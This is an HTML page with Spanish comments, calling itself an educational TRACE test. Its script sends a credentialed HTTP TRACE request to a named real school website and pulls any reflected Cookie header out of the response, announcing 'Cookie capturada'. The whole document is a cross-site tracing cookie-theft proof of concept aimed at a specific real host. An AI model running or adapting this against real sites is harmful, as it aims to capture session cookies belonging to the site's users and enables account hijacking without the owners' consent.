<!DOCTYPE html>
<html>
<head>
  <title>Prueba de TRACE</title>
</head>
<body>
  <h2>Ejecutando TRACE al servidor objetivo...</h2>

  <script>
    // Prueba educativa: solicita TRACE y captura las cabeceras reflejadas
    fetch("https://sicepachuca.cobaeh.edu.mx/", {
      method: "TRACE",
      mode: "cors", // Puedes probar tambiÃ©n "no-cors"
      credentials: "include" // Incluye cookies en la peticiÃ³n
    })
    .then(response => response.text())
    .then(data => {
      console.log("Respuesta del servidor TRACE:");
      console.log(data);

      // Extrae cookie si es visible
      const cookieMatch = data.match(/Cookie: (.+)/);
      if (cookieMatch) {
        alert("ðŸš¨ Cookie capturada: " + cookieMatch[1]);
      } else {
        alert("No se encontrÃ³ la cookie en la respuesta TRACE.");
      }
    })
    .catch(err => {
      console.error("Error en la solicitud TRACE:", err);
    });
  </script>
</body>
  </html>
